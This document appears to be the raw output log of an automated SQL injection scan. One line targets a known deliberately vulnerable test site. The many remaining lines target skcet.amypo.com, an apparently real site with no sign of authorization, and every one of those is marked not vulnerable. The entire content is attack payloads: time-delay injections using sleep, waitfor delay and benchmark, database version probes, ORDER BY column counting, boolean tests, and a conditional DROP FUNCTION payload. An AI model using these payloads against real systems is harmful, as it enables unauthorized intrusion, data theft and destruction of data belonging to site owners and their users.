URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
